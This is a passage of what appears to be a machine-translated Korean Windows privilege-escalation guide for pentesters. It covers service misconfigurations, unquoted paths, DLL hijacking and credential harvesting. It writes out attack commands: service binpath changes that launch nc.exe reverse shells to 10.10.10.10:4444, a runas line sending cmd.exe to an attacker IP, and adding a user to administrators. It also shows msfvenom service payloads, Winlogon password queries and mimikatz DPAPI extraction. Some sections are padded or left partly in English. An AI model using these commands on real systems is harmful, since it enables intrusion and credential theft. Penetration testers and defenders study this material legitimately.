- 계정 권한 할당: 사용자에게 할당된 권한을 제한하여 권한 상승을 방지합니다.
- 로그인 실패 감사: 로그인 실패 시스템을 감사하여 악의적인 로그인 시도를 탐지합니다.
- 로그인 경고 메시지: 사용자가 로그인할 때 경고 메시지를 표시하여 보안에 대한 인식을 높입니다.

암호 정책 및 기타 보안 설정은 Windows 운영 체제의 보안 강화에 중요한 역할을 합니다. 이러한 설정을 적절하게 구성하고 관리함으로써 시스템 보안을 향상시킬 수 있습니다.
```bash
net accounts
```
### 클립보드의 내용 가져오기

Windows 운영 체제에서는 클립보드에 저장된 내용을 가져와서 악용할 수 있는 경우가 있습니다. 클립보드에는 사용자가 복사한 텍스트, 이미지 또는 파일 등이 저장됩니다. 이를 통해 클립보드에 저장된 정보를 악용하여 권한 상승을 시도할 수 있습니다.

클립보드의 내용을 가져오기 위해 다음과 같은 방법을 사용할 수 있습니다.

#### 1. PowerShell 스크립트 사용

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Clipboard
{
    [DllImport("user32.dll")]
    public static extern IntPtr GetClipboardData(uint uFormat);

    [DllImport("user32.dll")]
    public static extern bool IsClipboardFormatAvailable(uint format);

    [DllImport("user32.dll")]
    public static extern bool OpenClipboard(IntPtr hWndNewOwner);

    [DllImport("user32.dll")]
    public static extern bool CloseClipboard();

    [DllImport("kernel32.dll")]
    public static extern IntPtr GlobalLock(IntPtr hMem);

    [DllImport("kernel32.dll")]
    public static extern bool GlobalUnlock(IntPtr hMem);

    [DllImport("kernel32.dll")]
    public static extern int GlobalSize(IntPtr hMem);

    public static string GetText()
    {
        string text = "";

        if (OpenClipboard(IntPtr.Zero))
        {
            if (IsClipboardFormatAvailable(13)) // CF_UNICODETEXT
            {
                IntPtr hClipboardData = GetClipboardData(13); // CF_UNICODETEXT

                if (hClipboardData != IntPtr.Zero)
                {
                    IntPtr pClipboardData = GlobalLock(hClipboardData);

                    if (pClipboardData != IntPtr.Zero)
                    {
                        int size = GlobalSize(pClipboardData);

                        if (size > 0)
                        {
                            byte[] buffer = new byte[size];
                            Marshal.Copy(pClipboardData, buffer, 0, size);
                            text = System.Text.Encoding.Unicode.GetString(buffer);
                        }

                        GlobalUnlock(pClipboardData);
                    }
                }
            }

            CloseClipboard();
        }

        return text;
    }
}
"@

[Clipboard]::GetText()
```

위의 PowerShell 스크립트는 `user32.dll` 및 `kernel32.dll`을 사용하여 클립보드의 내용을 가져옵니다. 스크립트를 실행하면 클립보드에 저장된 텍스트를 반환합니다.

#### 2. C# 프로그램 사용

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("user32.dll")]
    public static extern IntPtr GetClipboardData(uint uFormat);

    [DllImport("user32.dll")]
    public static extern bool IsClipboardFormatAvailable(uint format);

    [DllImport("user32.dll")]
    public static extern bool OpenClipboard(IntPtr hWndNewOwner);

    [DllImport("user32.dll")]
    public static extern bool CloseClipboard();

    [DllImport("kernel32.dll")]
    public static extern IntPtr GlobalLock(IntPtr hMem);

    [DllImport("kernel32.dll")]
    public static extern bool GlobalUnlock(IntPtr hMem);

    [DllImport("kernel32.dll")]
    public static extern int GlobalSize(IntPtr hMem);

    static void Main()
    {
        if (OpenClipboard(IntPtr.Zero))
        {
            if (IsClipboardFormatAvailable(13)) // CF_UNICODETEXT
            {
                IntPtr hClipboardData = GetClipboardData(13); // CF_UNICODETEXT

                if (hClipboardData != IntPtr.Zero)
                {
                    IntPtr pClipboardData = GlobalLock(hClipboardData);

                    if (pClipboardData != IntPtr.Zero)
                    {
                        int size = GlobalSize(pClipboardData);

                        if (size > 0)
                        {
                            byte[] buffer = new byte[size];
                            Marshal.Copy(pClipboardData, buffer, 0, size);
                            string text = System.Text.Encoding.Unicode.GetString(buffer);
                            Console.WriteLine(text);
                        }

                        GlobalUnlock(pClipboardData);
                    }
                }
            }

            CloseClipboard();
        }
    }
}
```

위의 C# 프로그램은 `user32.dll` 및 `kernel32.dll`을 사용하여 클립보드의 내용을 가져옵니다. 프로그램을 실행하면 클립보드에 저장된 텍스트를 출력합니다.

클립보드의 내용을 가져오는 방법은 다양하지만, 주의해야 할 점은 클립보드에 저장된 정보를 악용하지 않도록 사용자의 동의를 받아야 한다는 것입니다.
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

먼저, 프로세스 목록을 확인하여 **프로세스의 명령줄에 비밀번호가 있는지 확인**합니다.\
실행 중인 이진 파일을 **덮어쓸 수 있는지** 또는 이진 파일 폴더에 쓰기 권한이 있는지 확인하여 가능한 [**DLL Hijacking 공격**](dll-hijacking.md)을 악용할 수 있는지 확인합니다.
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 실행 중인 [**electron/cef/chromium 디버거**를 확인하고 권한 상승에 악용할 수 있는지 확인하십시오](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 이진 파일의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 이진 파일의 폴더 권한 확인 (DLL Hijacking)**

DLL Hijacking에 대한 폴더 권한을 확인합니다.
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 메모리 비밀번호 마이닝

**Sysinternals**의 **procdump**를 사용하여 실행 중인 프로세스의 메모리 덤프를 생성할 수 있습니다. FTP와 같은 서비스는 **메모리에 평문으로 인증 정보를 저장**하므로, 메모리를 덤프하고 인증 정보를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 보안 취약한 GUI 앱

**SYSTEM으로 실행되는 앱은 사용자가 CMD를 생성하거나 디렉토리를 탐색할 수 있게 할 수 있습니다.**

예시: "Windows 도움말 및 지원" (Windows + F1), "명령 프롬프트 열기를 클릭"하여 "명령 프롬프트"를 검색합니다.

## 서비스

서비스 목록 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

**sc**를 사용하여 서비스의 정보를 얻을 수 있습니다.
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하기 위해 _Sysinternals_의 **accesschk** 바이너리를 사용하는 것이 좋습니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"인증된 사용자"가 서비스를 수정할 수 있는지 확인하는 것이 좋습니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[여기에서 XP용 accesschk.exe를 다운로드할 수 있습니다](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

이 오류가 발생하는 경우 (예: SSDPSRV와 함께):

_시스템 오류 1058이 발생했습니다._\
_서비스를 시작할 수 없습니다. 비활성화되었거나 연결된 기기가 없기 때문입니다._

다음을 사용하여 활성화할 수 있습니다.
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1에서 서비스 upnphost는 작동하기 위해 SSDPSRV에 의존한다는 것을 염두에 두십시오.**

**이 문제의 또 다른 해결책은 다음을 실행하는 것입니다:**
```
sc.exe config usosvc start= auto
```
### **서비스 이진 경로 수정**

"인증된 사용자" 그룹이 서비스에 대해 **SERVICE_ALL_ACCESS** 권한을 가지는 경우, 서비스의 실행 가능한 이진 파일을 수정할 수 있습니다. **sc**를 수정하고 실행하는 방법은 다음과 같습니다:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작

To restart a service, you can use the following command:

```bash
net stop [service_name]
net start [service_name]
```

Replace `[service_name]` with the name of the service you want to restart.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
다양한 권한을 통해 권한을 상승시킬 수 있습니다:
- **SERVICE_CHANGE_CONFIG**: 서비스 이진 파일의 재구성을 허용합니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하여 서비스 구성을 변경할 수 있는 능력을 제공합니다.
- **WRITE_OWNER**: 소유권 획득 및 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성 변경 능력을 상속합니다.
- **GENERIC_ALL**: 또한 서비스 구성 변경 능력을 상속합니다.

이 취약점의 탐지와 악용을 위해 _exploit/windows/local/service_permissions_을(를) 사용할 수 있습니다.

### 서비스 이진 파일 약한 권한

**서비스에 의해 실행되는 이진 파일을 수정할 수 있는지** 또는 이진 파일이 위치한 폴더에 **쓰기 권한**이 있는지 확인하세요 ([**DLL Hijacking**](dll-hijacking.md))**.**\
**wmic**을 사용하여 서비스에 의해 실행되는 모든 이진 파일을 가져올 수 있으며, **icacls**를 사용하여 권한을 확인할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc**와 **icacls**도 사용할 수 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 레지스트리 수정 권한

서비스 레지스트리를 수정할 수 있는지 확인해야 합니다.\
서비스 레지스트리에 대한 권한을 확인하려면 다음을 수행할 수 있습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**인증된 사용자** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 그렇다면 서비스에 의해 실행되는 이진 파일을 변경할 수 있습니다.

실행되는 이진 파일의 경로를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 서비스 레지스트리 AppendData/AddSubdirectory 권한

레지스트리에 이 권한이 있다면 **이 레지스트리에서 하위 레지스트리를 생성할 수 있습니다**. Windows 서비스의 경우, 이는 **임의의 코드를 실행하는 데 충분합니다**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### 언인용된 서비스 경로

실행 파일의 경로가 따옴표 안에 없는 경우, Windows는 공백 이전의 모든 끝을 실행하려고 시도합니다.

예를 들어, 경로 _C:\Program Files\Some Folder\Service.exe_의 경우 Windows는 다음을 실행하려고 합니다:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
다음은 내장된 Windows 서비스에 속하지 않는 모든 언인용 서비스 경로를 나열합니다:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**이 취약점을 감지하고 악용**하기 위해 metasploit을 사용할 수 있습니다: `exploit/windows/local/trusted\_service\_path`
metasploit을 사용하여 수동으로 서비스 이진 파일을 생성할 수도 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 복구 조치

Windows는 서비스가 실패할 경우 수행할 조치를 사용자가 지정할 수 있도록 허용합니다. 이 기능은 이진 파일을 가리킬 수 있도록 구성할 수 있습니다. 이 이진 파일이 대체 가능하다면 권한 상승이 가능할 수 있습니다. 자세한 내용은 [공식 문서](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN)에서 확인할 수 있습니다.

## 응용 프로그램

### 설치된 응용 프로그램

**바이너리 파일의 권한** (하나를 덮어쓸 수 있고 권한을 상승시킬 수 있을지도 모릅니다) 및 **폴더의 권한** ([DLL Hijacking](dll-hijacking.md))을 확인하세요.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 파일을 읽거나 관리자 계정 (schedtasks)에 의해 실행될 이진 파일을 수정할 수 있는지 확인하려면 구성 파일을 수정할 수 있는지 확인하십시오.

시스템에서 약한 폴더/파일 권한을 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 시작 시 실행

**다른 사용자에 의해 실행될 레지스트리 또는 이진 파일을 덮어쓸 수 있는지 확인하세요.**\
권한 상승을 위해 흥미로운 **자동 실행 위치**에 대해 자세히 알아보려면 **다음 페이지**를 **참조하세요**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### 드라이버

가능한 **제3자의 이상한/취약한** 드라이버를 찾으세요.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL 하이재킹

만약 PATH에 있는 폴더 중 하나에 **쓰기 권한**이 있다면, 프로세스에 의해 로드되는 DLL을 하이재킹하여 **권한 상승**을 할 수 있습니다.

PATH 내의 모든 폴더의 권한을 확인하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
더 자세한 정보를 얻으려면 다음을 확인하십시오:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## 네트워크

### 공유 폴더
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### 호스트 파일

호스트 파일에 하드코딩된 다른 알려진 컴퓨터를 확인하세요.
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 및 DNS

#### 네트워크 인터페이스

네트워크 인터페이스는 컴퓨터와 네트워크 간의 연결을 관리하는 데 사용되는 하드웨어 또는 소프트웨어입니다. 윈도우 운영체제에서는 다양한 유형의 네트워크 인터페이스를 지원합니다. 이러한 인터페이스는 네트워크 통신을 위해 IP 주소, 서브넷 마스크, 게이트웨이 등의 구성 정보를 가지고 있습니다.

#### DNS (Domain Name System)

DNS는 도메인 이름과 IP 주소 간의 매핑을 관리하는 시스템입니다. DNS를 사용하면 사용자가 도메인 이름을 입력하여 웹 사이트에 액세스할 수 있습니다. 윈도우 운영체제에서는 DNS 서버에 대한 설정을 관리하는 기능을 제공합니다. 이 설정을 통해 DNS 서버를 변경하거나 DNS 캐시를 플러시할 수 있습니다.

#### 네트워크 인터페이스 및 DNS 설정 확인

윈도우 운영체제에서는 `ipconfig` 명령을 사용하여 현재 네트워크 인터페이스 및 DNS 설정을 확인할 수 있습니다. 이 명령은 명령 프롬프트나 PowerShell에서 실행할 수 있습니다.

```plaintext
ipconfig /all
```

위의 명령을 실행하면 현재 시스템의 네트워크 인터페이스 정보와 DNS 설정이 표시됩니다. 이를 통해 현재 시스템이 어떤 네트워크 인터페이스를 사용하고 있는지, DNS 서버가 어떻게 구성되어 있는지 확인할 수 있습니다.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 열린 포트

외부에서 **제한된 서비스**를 확인하세요.
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블

라우팅 테이블은 네트워크에서 패킷을 전송하는 데 사용되는 경로 정보를 포함하는 데이터베이스입니다. 이 테이블은 목적지 IP 주소와 해당 주소로 패킷을 보내기 위해 사용되는 넥스트 홉(Next Hop)의 관계를 기록합니다.

라우팅 테이블은 호스트 또는 라우터에 저장되며, 패킷이 전송될 때마다 사용됩니다. 패킷의 목적지 IP 주소를 확인하고 해당 주소에 대한 최적의 경로를 결정하는 데 사용됩니다.

라우팅 테이블은 다양한 경로 정보를 포함할 수 있으며, 이를 통해 패킷이 목적지까지 가장 효율적인 경로로 전송될 수 있습니다. 이러한 경로 정보는 네트워크 관리자에 의해 수동으로 구성되거나, 라우팅 프로토콜을 통해 자동으로 업데이트될 수 있습니다.

라우팅 테이블은 네트워크 보안 및 성능 최적화에 중요한 역할을 합니다. 올바르게 구성된 라우팅 테이블은 패킷의 효율적인 전송을 보장하고, 네트워크 트래픽을 효과적으로 관리할 수 있도록 도와줍니다.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블

ARP(Address Resolution Protocol) 테이블은 네트워크 장치에서 IP 주소와 MAC 주소 간의 매핑 정보를 저장하는 테이블입니다. 이 테이블은 로컬 네트워크에서 통신할 때 IP 주소를 MAC 주소로 변환하는 데 사용됩니다. ARP 테이블은 네트워크 트래픽을 라우팅하는 데 도움이 되며, 로컬 프라이빗 네트워크에서 중요한 역할을 합니다.

ARP 테이블은 일반적으로 운영 체제에서 관리되며, 네트워크 인터페이스에 대한 정보를 포함합니다. 이 테이블은 IP 주소와 해당하는 MAC 주소 간의 매핑을 저장하며, 이를 통해 패킷이 올바른 대상에게 전달됩니다. ARP 테이블은 네트워크 장치에서 자동으로 업데이트되며, 일부 운영 체제에서는 ARP 캐시라고도 불립니다.

ARP 테이블은 로컬 프라이빗 네트워크에서 중요한 정보를 제공하므로, ARP 스푸핑과 같은 공격으로부터 보호해야 합니다. ARP 스푸핑은 공격자가 네트워크에서 다른 장치의 ARP 테이블을 위조하여 트래픽을 가로채는 공격입니다. 이를 방지하기 위해 네트워크 장치에서 ARP 보안 기능을 활성화하고, ARP 테이블을 주기적으로 확인하여 이상한 동작을 감지할 수 있습니다.

ARP 테이블은 네트워크 통신에 필수적인 요소이므로, 이를 이해하고 관리하는 것이 중요합니다. ARP 테이블을 이용하여 네트워크 트래픽을 효율적으로 라우팅하고, ARP 스푸핑과 같은 공격으로부터 보호할 수 있습니다.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**방화벽 관련 명령어는 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 목록, 규칙 생성, 비활성화, 활성화...)**

더 많은 [네트워크 열거를 위한 명령어는 여기에서 확인하세요](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
이진 파일 `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

루트 사용자 권한을 얻으면 어떤 포트에서든 듣기가 가능합니다 (`nc.exe`를 사용하여 포트에서 처음 듣기를 시도할 때 방화벽에서 `nc`를 허용할 것인지 GUI를 통해 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
루트로 bash를 쉽게 시작하려면 `--default-user root`를 시도해 볼 수 있습니다.

`WSL` 파일 시스템을 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 폴더에서 탐색할 수 있습니다.

## Windows 자격 증명

### Winlogon 자격 증명
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 자격 증명 관리자 / Windows 보관함

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)에서 확인할 수 있습니다.\
Windows 보관함은 **Windows가 사용자를 자동으로 로그인할 수 있는 서버, 웹사이트 및 다른 프로그램의 사용자 자격 증명을 저장**합니다. 처음에는 사용자가 Facebook 자격 증명, Twitter 자격 증명, Gmail 자격 증명 등을 저장하여 브라우저를 통해 자동으로 로그인할 수 있다고 생각할 수 있습니다. 하지만 그렇지 않습니다.

Windows 보관함은 Windows가 사용자를 자동으로 로그인할 수 있는 자격 증명을 저장하므로, **자격 증명이 필요한 Windows 애플리케이션은 사용자가 매번 사용자 이름과 비밀번호를 입력하는 대신에 Credential Manager 및 Windows 보관함을 사용하여 제공된 자격 증명을 사용**할 수 있습니다.

애플리케이션이 Credential Manager와 상호 작용하지 않는 한, 특정 리소스의 자격 증명을 사용할 수 없을 것으로 생각됩니다. 따라서, 애플리케이션이 보관함을 사용하려면 기본 저장 보관함에서 해당 리소스의 자격 증명을 요청하기 위해 어떻게든 **자격 증명 관리자와 통신**해야 합니다.

`cmdkey`를 사용하여 기기에 저장된 자격 증명을 나열할 수 있습니다.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `runas`를 `/savecred` 옵션과 함께 사용할 수 있습니다. 다음 예제는 SMB 공유를 통해 원격 이진 파일을 호출합니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`를 제공된 자격 증명으로 사용하는 방법입니다.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
참고로 mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1)에서 얻을 수 있습니다.

### DPAPI

**데이터 보호 API (DPAPI)**는 주로 Windows 운영 체제에서 비대칭 개인 키의 대칭 암호화를 위해 사용되는 데이터의 대칭 암호화 방법을 제공합니다. 이 암호화는 사용자 또는 시스템 비밀을 엔트로피에 크게 기여하는 데 사용합니다.

**DPAPI는 사용자의 로그인 비밀로부터 유도된 대칭 키를 통해 키를 암호화하는 기능을 제공**합니다. 시스템 암호화가 관련된 시나리오에서는 시스템의 도메인 인증 비밀을 사용합니다.

DPAPI를 사용하여 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉토리에 저장됩니다. 여기서 `{SID}`는 사용자의 [보안 식별자](https://en.wikipedia.org/wiki/Security\_Identifier)를 나타냅니다. **DPAPI 키는 일반적으로 사용자의 개인 키를 보호하는 마스터 키와 동일한 파일에 함께 저장되며, 일반적으로 64바이트의 임의 데이터로 구성**됩니다. (이 디렉토리에 대한 액세스는 제한되어 있어 CMD의 `dir` 명령을 통해 내용을 나열하는 것을 방지하지만 PowerShell을 통해 나열할 수 있습니다).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
당신은 적절한 인수 (`/pvk` 또는 `/rpc`)와 함께 **mimikatz 모듈** `dpapi::masterkey`를 사용하여 이를 복호화할 수 있습니다.

**마스터 비밀번호로 보호된 자격 증명 파일**은 일반적으로 다음 위치에 있습니다:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz 모듈** `dpapi::cred`를 사용하여 적절한 `/masterkey`로 복호화할 수 있습니다.\
루트 권한이 있는 경우 `sekurlsa::dpapi` 모듈을 사용하여 **메모리**에서 **다양한 DPAPI 마스터키**를 추출할 수 있습니다.

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell 자격 증명

**PowerShell 자격 증명**은 주로 **스크립팅** 및 자동화 작업에 사용되며, 암호화된 자격 증명을 편리하게 저장하는 방법으로 사용됩니다. 이 자격 증명은 일반적으로 동일한 사용자가 생성한 컴퓨터에서만 동일한 사용자에 의해 복호화될 수 있도록 **DPAPI**로 보호됩니다.

자격 증명이 포함된 파일에서 PS 자격 증명을 **복호화**하려면 다음을 수행할 수 있습니다:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### 와이파이

Wifi is a wireless networking technology that allows devices to connect to the internet without the need for physical cables. It is commonly used in homes, offices, and public places to provide internet access to multiple devices simultaneously.

와이파이는 물리적인 케이블 없이 장치들이 인터넷에 연결할 수 있는 무선 네트워킹 기술입니다. 가정, 사무실 및 공공 장소에서 여러 장치에 동시에 인터넷 접속을 제공하기 위해 일반적으로 사용됩니다.

Wifi networks are secured using various encryption protocols such as WEP, WPA, and WPA2 to prevent unauthorized access. However, there are several techniques that hackers can use to compromise wifi networks and gain unauthorized access.

